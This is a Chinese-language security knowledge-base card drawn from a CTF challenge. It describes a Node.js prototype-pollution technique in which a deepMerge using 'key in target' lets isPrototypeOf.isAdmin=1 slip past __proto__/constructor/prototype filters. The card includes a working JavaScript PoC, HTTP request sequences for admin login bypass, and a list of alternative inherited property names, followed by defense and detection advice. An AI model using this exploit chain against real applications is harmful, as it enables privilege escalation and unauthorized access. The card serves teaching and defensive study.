---
id: web-nodejs-prototype-pollution-inherited-property-subkey
title: deepMerge 写入原型链既有属性的子键：绕过 __proto__/constructor/prototype 过滤的替代污染路径
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: js-prototype-inherited-property-subkey-pollution
tags:
- nodejs
- javascript
- prototype-pollution
- deep-merge
- inherited-property
- filter-bypass
- auth-bypass
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:39:26+08:00'
  notes: 已对照原文与图02/08/09/10核对：deepMerge 用 key in target 递归，isPrototypeOf 在 Object.prototype 上，Object.assign 把 isAdmin=1 写入该共享函数对象；parseQueryParams 仅改名为 __unsafe$ 前缀过滤 __proto__/prototype/constructor，isPrototypeOf.isAdmin 不受影响；登录绕过使 users['isPrototypeOf'].isAdmin 与 true 宽松比较成立，图10 取得 flag。原文为 justCTF Positive Players CTF，无受影响版本；PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-inherited-property-subkey/
draft: false
kb_aliases:
- 原型既有属性污染
- isPrototypeOf.isAdmin 污染
- key in target 原型链污染
- 不经过 __proto__ 的原型污染
- Object.prototype 方法属性污染
- deepMerge inherited property pollution
---

## 一句话结论

当递归合并函数用 `key in target`（会沿原型链查找）判断是否递归、并对 `target[key]` 赋值时，即使解析层把 `__proto__`、`prototype`、`constructor` 三个键全部过滤，攻击者仍可传入 `isPrototypeOf.isAdmin=1` 这类“原型链上已存在属性”的路径：合并会拿到 `Object.prototype.isPrototypeOf` 这个共享函数对象，并把 `isAdmin` 写成它的自有属性；之后任何对 `obj.isPrototypeOf.isAdmin` 的读取都会沿原型链命中该污染值，从而绕过“必须到达 Object.prototype 才能污染”的直觉。

## 原理

- 漏洞合并函数的典型形态：
  ```javascript
  const deepMerge = (target, source) => {
    for (const key in source) {
      if (source[key] instanceof Object && key in target) {
        Object.assign(source[key], deepMerge(target[key], source[key]));
      }
    }
    Object.assign(target || {}, source);
    return target;
  };
  ```
- 危险点在 `key in target`：`in` 运算符同时检查自有属性和原型链。`target`（如用户主题配置对象）继承自 `Object.prototype`，所以 `'isPrototypeOf' in target` 为真，`target['isPrototypeOf']` 返回的是 `Object.prototype` 上那个内置函数对象，而不是 `undefined`。
- 递归进入后，`deepMerge(内置函数, {isAdmin:'1'})` 把 `isAdmin` 作为自有属性写到该函数对象上（`Object.assign` 直接修改传入对象）。函数对象是可扩展的，赋值成功且全局共享。
- 这个函数对象就存放在 `Object.prototype` 上，所有普通对象都能通过 `obj.isPrototypeOf` 拿到同一个引用，因此 `obj.isPrototypeOf.isAdmin` 对所有对象可见。注意污染的不是 `Object.prototype.isAdmin`，而是 `Object.prototype.isPrototypeOf` 所指对象的 `isAdmin`；常规的“检查 `Object.prototype` 自身属性是否异常”检测看不到它。
- 过滤为什么挡不住：解析层只把键名 `__proto__`、`prototype`、`constructor` 重命名/拒绝；`isPrototypeOf` 是合法标识符，`isPrototypeOf.isAdmin` 被拆成 `['isPrototypeOf','isAdmin']`，两层都通过校验。
- 最终危害需要一个“把继承键当对象解引用”的读取点。原文中登录绕过使 `req.session.userId = 'isPrototypeOf'`，随后权限判断 `users[req.session.userId].isAdmin == true` 实际变成 `users['isPrototypeOf'].isAdmin`；`users` 没有自有 `isPrototypeOf`，沿原型链取到被污染的函数对象，`isAdmin` 为字符串 `'1'`，而 `'1' == true`（宽松比较）成立，权限判定被绕过。
- 若比较改成 `=== true`，查询字符串解析出的字符串无法直接等于布尔值，该链会失效；宽松比较是此例成立的必要条件之一。

## 触发条件

- 服务端存在递归 merge/深拷贝/配置合并，递归条件使用 `key in target` 或直接读取 `target[key]` 判断类型，而不是 `Object.hasOwn`。
- 用户输入可控制嵌套键（查询参数按 `.` 拆分、JSON 嵌套对象、表单嵌套参数等）。
- 过滤只覆盖 `__proto__`、`prototype`、`constructor`（或只做字符串黑名单），未禁止 `Object.prototype` 上的成员名。
- 合并目标或中间对象继承自 `Object.prototype`（普通对象，未用 `Object.create(null)`）。
- 存在读取点把用户可控字符串当作属性键去解引用一个继承属性，或直接读取 `obj.<内置成员>.<子属性>`。
- 权限标志等判断使用宽松比较，允许字符串 `'1'` 与 `true` 相等。

## 利用步骤

1. 正常注册/登录，确认 `/theme` 一类接口会把查询参数按 `.` 拆成嵌套对象后交给 `deepMerge`。
2. 确认过滤行为：直接发 `__proto__.isAdmin=1` 应被改名或拒绝，说明存在黑名单。
3. 改发继承属性路径，例如 `isPrototypeOf.isAdmin=1`；服务端解析为 `{isPrototypeOf:{isAdmin:'1'}}`，merge 时命中 `Object.prototype.isPrototypeOf` 函数对象并写入 `isAdmin`。
4. 通过一次新请求读取验证：让业务代码走到 `obj.isPrototypeOf.isAdmin`（或构造业务键为该继承名），应得到 `'1'`。
5. 将该继承键用作登录用户名（配合“原型链继承键登录绕过”），使权限判断解引用到被污染的函数对象，完成管理员判定。
6. 访问受保护资源确认最终危害。

## PoC

最小复现（不依赖框架）：

```javascript
const deepMerge = (target, source) => {
  for (const key in source) {
    if (source[key] instanceof Object && key in target) {
      Object.assign(source[key], deepMerge(target[key], source[key]));
    }
  }
  Object.assign(target || {}, source);
  return target;
};

const themeConfig = { theme: { primaryColor: '#6200EE' } };
deepMerge(themeConfig, { isPrototypeOf: { isAdmin: '1' } });

console.log(({}).isPrototypeOf.isAdmin);   // '1' —— 内置函数对象被写入
console.log({}.isPrototypeOf.isAdmin);     // '1'
console.log('1' == true);                  // true —— 宽松比较成立
```

对照：`deepMerge(themeConfig, { ['__proto__']: { isAdmin: '1' } })` 在带黑名单的解析层会被拦截或改名，而上面的 `isPrototypeOf` 路径不会。

实际请求：

```http
GET /theme?isPrototypeOf.isAdmin=1 HTTP/1.1
Host: target:3000
Cookie: connect.sid=<会话>
```

随后：

```http
POST /login HTTP/1.1
Host: target:3000
Content-Type: application/x-www-form-urlencoded

username=isPrototypeOf
```

再访问 `/flag`（或等价管理员接口）即可。

## 变体与关联

- 可替换的继承属性名：`hasOwnProperty`、`propertyIsEnumerable`、`toLocaleString`、`toString`、`valueOf`、`__lookupGetter__`、`__defineGetter__` 等；任何存在于原型链上、值为对象/函数的属性都可作为落点。
- 若 merge 目标继承自其他原型（如 `Array.prototype`、框架类实例），同理可写入数组方法或类原型方法的子属性。
- 与“过滤绕过”卡的区别：那张卡通过 `constructor.prototype`、嵌套键、Unicode 转义等继续到达 `Object.prototype`；本卡完全不经过 `Object.prototype` 本身，而是污染其上的属性对象，因此对“禁止三个危险键名”的过滤天然免疫。
- 与“原型链继承键登录绕过”组合时构成完整提权链：前者提供幽灵身份与继承键，后者把该继承键下的权限字段变为真。
- 其他读取点：模板引擎配置、`child_process` 选项对象、日志/序列化配置等，只要代码按“继承键 + 子属性”解引用就可能被利用。

## 检测与防御

- 合并递归必须用自有属性判断：`Object.hasOwn(target, key)` 或 `Object.prototype.hasOwnProperty.call(target, key)`，禁止用 `in` 判断是否递归。
- 更新目标时不要直接改 `target[key]` 指向的既有对象；先确认 `target[key]` 是本次创建的自有容器（`Object.create(null)`/新对象）再合并。
- 容器统一用 `Object.create(null)` 或 `Map`；模板/配置读取使用明确字段白名单，避免动态字符串键解引用。
- 仅禁止 `__proto__`/`prototype`/`constructor` 不够；还应拒绝与 `Object.prototype`、`Function.prototype`、`Array.prototype` 成员同名的键。
- 冻结内置原型时注意：`Object.freeze(Object.prototype)` 只冻结 `Object.prototype` 自身，不会冻结存放在其上的函数对象，`Object.prototype.isPrototypeOf.isAdmin` 仍可写入；需要同时冻结相关内置函数，或用无原型容器从结构上消除继承。
- 权限判断使用严格相等（`=== true`）并要求布尔类型，避免字符串 `'1'` 通过宽松比较。
- 代码审计搜索 `for...in` + `key in target` + 动态 `target[key]` 的递归合并模式；运行时监控内置函数对象上出现异常自有属性（如 `isPrototypeOf.isAdmin`、`toString.isAdmin`）。
